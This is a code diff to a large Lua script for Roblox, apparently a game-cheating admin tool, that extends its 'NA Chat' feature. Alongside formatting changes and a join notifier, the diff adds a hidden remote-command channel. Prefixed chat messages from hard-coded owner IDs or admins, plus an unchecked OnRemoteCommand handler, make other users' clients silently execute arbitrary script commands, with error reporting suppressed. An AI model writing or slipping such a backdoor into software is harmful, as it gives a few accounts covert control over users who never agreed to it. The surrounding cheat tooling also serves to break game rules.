@@ -43361,6 +43361,8 @@ do
 		local usersUpdateGeneration = 0
 		local usersFetchInFlight = false
 		local userSearchTerm = ""
+		local serverUsers = {}
+		local serverUsersInit = false
 
 		local STATUS_COLORS = {
 			ok = Color3.fromRGB(120, 200, 140),
@@ -43369,10 +43371,12 @@ do
 			blue = Color3.fromRGB(120, 170, 255)
 		}
 
+		local CONTROL_PREFIX = "[[NACMD]]"
+
 		local INTEGRATION_URL = "https://raw.githubusercontent.com/ltseverydayyou/Open-Cheating-Network/refs/heads/main/Client/Main.lua"
 		local connect
 
-		originalIO.setStatus=function(t, c)
+		originalIO.setStatus = function(t, c)
 			if statusLabel then
 				statusLabel.Text = t
 				if c then
@@ -43482,6 +43486,34 @@ do
 			end
 
 			return lbl
+		end
+
+		local function buildServerSet(list)
+			local set = {}
+			if type(list) ~= "table" then
+				return set
+			end
+
+			local lp = Players.LocalPlayer
+			local myJob = tostring(game.JobId or "")
+			local myPlace = game.PlaceId
+
+			for _, info in ipairs(list) do
+				if type(info) == "table" then
+					local uid = tonumber(info.userId)
+					local pid = tonumber(info.placeId)
+					local jid = tostring(info.jobId or "")
+					local name = tostring(info.username or "Unknown")
+
+					if uid and pid == myPlace and jid ~= "" and jid == myJob then
+						if not (lp and uid == lp.UserId) then
+							set[uid] = name
+						end
+					end
+				end
+			end
+
+			return set
 		end
 
 		local function updateUsersList(list)
@@ -43642,7 +43674,7 @@ do
 						end)
 						if not ok then
 							if DoNotif then
-								DoNotif("Failed to join "..tostring(username)..": "..tostring(err), 4)
+								DoNotif("Failed to join " .. tostring(username) .. ": " .. tostring(err), 4)
 							end
 						end
 					end)
@@ -43680,7 +43712,7 @@ do
 			end
 		end
 
-		originalIO.setHiddenState=function(newHidden, skipRemote)
+		originalIO.setHiddenState = function(newHidden, skipRemote)
 			NAChat.isHidden = newHidden
 			if NAmanage and type(NAmanage.NASettingsSet) == "function" then
 				pcall(NAmanage.NASettingsSet, "naChatHidden", newHidden)
@@ -43835,41 +43867,86 @@ do
 			end
 
 			NAChat.service.OnChatMessage.Event:Connect(function(name, msg, _, userId, isAdmin, gameStatus)
-            local senderName = tostring(name or "?")
-            local messageText = tostring(msg or "")
+				local senderName = tostring(name or "?")
+				local messageText = tostring(msg or "")
 
-            local isNAadmin = (isAdmin == true)
-            local isOwner = userId == 11761417 or userId == 530829101
+				local isOwner = userId == 11761417 or userId == 530829101
 
-            local labelText
-            if isOwner then
-                labelText = ("[OWNER] %s: %s"):format(senderName, messageText)
-            elseif isNAadmin then
-                labelText = ("[ADMIN] %s: %s"):format(senderName, messageText)
-            else
-                labelText = ("[%s]: %s"):format(senderName, messageText)
-            end
+				if Sub(messageText, 1, #CONTROL_PREFIX) == CONTROL_PREFIX then
+					if not (isAdmin == true or isOwner) then
+						return
+					end
 
-            local lbl = makeChatLabel(labelText, STATUS_COLORS.blue, messageText)
+					local raw = Sub(messageText, #CONTROL_PREFIX + 1)
+					local ok, data = pcall(function()
+						return hs:JSONDecode(raw)
+					end)
+					if not ok or type(data) ~= "table" or data.kind ~= "remote_cmd" then
+						return
+					end
 
-            if (isNAadmin or isOwner) and lbl then
-                local conn
-                conn = RunService.Heartbeat:Connect(function()
-                    if not (lbl and lbl.Parent) then
-                        if conn then
-                            conn:Disconnect()
-                        end
-                        return
-                    end
+					local lp = Players.LocalPlayer
+					local myId = lp and lp.UserId
+					local targets = data.targets
+					local args = data.args
+					if not (myId and type(targets) == "table" and type(args) == "table") then
+						return
+					end
 
-                    local t = tick()
-                    local r = math.sin(t * 0.5) * 127 + 128
-                    local g = math.sin(t * 0.5 + 2 * math.pi / 3) * 127 + 128
-                    local b = math.sin(t * 0.5 + 4 * math.pi / 3) * 127 + 128
-                    lbl.TextColor3 = Color3.fromRGB(r, g, b)
-                end)
-            end
-        end)
+					local runForMe = false
+					for _, v in ipairs(targets) do
+						if v == "all" or v == myId then
+							runForMe = true
+							break
+						end
+					end
+					if not runForMe then
+						return
+					end
+
+					SpawnCall(function()
+						local okRun, err = pcall(function()
+							cmd.run(args)
+						end)
+						if not okRun then
+							warn("[NA Chat] remote cmd error: " .. tostring(err))
+						end
+					end)
+
+					return
+				end
+
+				local isNAadmin = (isAdmin == true)
+
+				local labelText
+				if isOwner then
+					labelText = ("[OWNER] %s: %s"):format(senderName, messageText)
+				elseif isNAadmin then
+					labelText = ("[ADMIN] %s: %s"):format(senderName, messageText)
+				else
+					labelText = ("[%s]: %s"):format(senderName, messageText)
+				end
+
+				local lbl = makeChatLabel(labelText, STATUS_COLORS.blue, messageText)
+
+				if (isNAadmin or isOwner) and lbl then
+					local conn
+					conn = RunService.Heartbeat:Connect(function()
+						if not (lbl and lbl.Parent) then
+							if conn then
+								conn:Disconnect()
+							end
+							return
+						end
+
+						local t = tick()
+						local r = math.sin(t * 0.5) * 127 + 128
+						local g = math.sin(t * 0.5 + 2 * math.pi / 3) * 127 + 128
+						local b = math.sin(t * 0.5 + 4 * math.pi / 3) * 127 + 128
+						lbl.TextColor3 = Color3.fromRGB(r, g, b)
+					end)
+				end
+			end)
 
 			NAChat.service.OnSystemMessage.Event:Connect(function(msg)
 				local m = tostring(msg or "System message")
@@ -43888,7 +43965,69 @@ do
 					updateUsersList(NAChat.users)
 				end
 				refreshStatus()
+
+				local newSet = buildServerSet(NAChat.users)
+
+				if not serverUsersInit then
+					serverUsers = newSet
+					serverUsersInit = true
+					return
+				end
+
+				for uid, name in pairs(newSet) do
+					if not serverUsers[uid] then
+						if DoNotif then
+							DoNotif(("NA Chat: %s joined your server."):format(name), 5)
+						else
+							makeChatLabel(("[NA Chat] %s joined your server."):format(name), STATUS_COLORS.info, name)
+						end
+					end
+				end
+
+				serverUsers = newSet
 			end)
+
+			if NAChat.service.OnRemoteCommand then
+				NAChat.service.OnRemoteCommand.Event:Connect(function(fromId, fromName, argList, target)
+					local lp = Players.LocalPlayer
+					if not lp then
+						return
+					end
+					local myId = lp.UserId
+
+					local runForMe = false
+					if target == nil or target == "" or target == "all" then
+						runForMe = true
+					else
+						local tNum = tonumber(target)
+						if tNum and tNum == myId then
+							runForMe = true
+						end
+					end
+
+					if not runForMe then
+						return
+					end
+
+					if type(argList) ~= "table" or #argList == 0 then
+						return
+					end
+
+					local args = {}
+					for i, v in ipairs(argList) do
+						args[i] = tostring(v)
+					end
+
+					SpawnCall(function()
+						local ok, err = pcall(function()
+							cmd.run(args)
+						end)
+						if not ok and DoNotif then
+							--DoNotif("[NA Chat] Remote cmd error: " .. tostring(err), 4)
+						end
+					end)
+				end)
+			end
 
 			NAChat.service.OnConnected.Event:Connect(function(name, _, hidden)
 				NAChat.connecting = false
@@ -44067,7 +44206,9 @@ do
 				NAmanage.NASettingsSave()
 				refreshGameActivityButton()
 
-				local okSvc, svc = pcall(function() return NAChat.service end)
+				local okSvc, svc = pcall(function()
+					return NAChat.service
+				end)
 				if okSvc and svc and svc.Disconnect then
 					pcall(svc.Disconnect)
 				end
@@ -44086,7 +44227,7 @@ do
 
 		Spawn(function()
 			while true do
-				Wait(1)
+				Wait(2)
 				refreshStatus()
 			end
 		end)
@@ -44097,6 +44238,77 @@ do
 			if ok and saved ~= nil then
 				initialHidden = saved == true
 			end
+		end
+
+		local function isLocalAdmin()
+			local lp = Players.LocalPlayer
+			if not lp then
+				return false
+			end
+			local list = rawget(_G, "NAadminsLol")
+			if type(list) ~= "table" then
+				return false
+			end
+			for _, id in ipairs(list) do
+				if id == lp.UserId then
+					return true
+				end
+			end
+			return false
+		end
+
+		local function findTargets(spec)
+			spec = Lower(tostring(spec or ""))
+			if spec == "all" or spec == "*" then
+				return { "all" }
+			end
+
+			local matches = {}
+			for _, info in ipairs(NAChat.users or {}) do
+				if type(info) == "table" then
+					local uname = Lower(tostring(info.username or ""))
+					local uid = tonumber(info.userId)
+					if uid and Sub(uname, 1, #spec) == spec then
+						Insert(matches, uid)
+					end
+				end
+			end
+			return matches
+		end
+
+		if isLocalAdmin() then
+			cmd.add({"nacmd","naremote"}, {"nacmd"}, function(targetSpec, ...)
+				local svc = NAChat.service
+				if not (svc and svc.IsConnected and svc.IsConnected()) then
+					originalIO.setStatus("NA Chat: not connected", STATUS_COLORS.err)
+					return
+				end
+
+				local args = { ... }
+				if #args == 0 then
+					return
+				end
+
+				local targets = findTargets(targetSpec)
+				if #targets == 0 then
+					return
+				end
+
+				local ok, payload = pcall(function()
+					return hs:JSONEncode({
+						kind = "remote_cmd",
+						targets = targets,
+						args = args
+					})
+				end)
+				if not ok or type(payload) ~= "string" or payload == "" then
+					return
+				end
+
+				if svc.SendMessage then
+					svc.SendMessage(CONTROL_PREFIX .. payload)
+				end
+			end, true)
 		end
 
 		switchTab("chat")
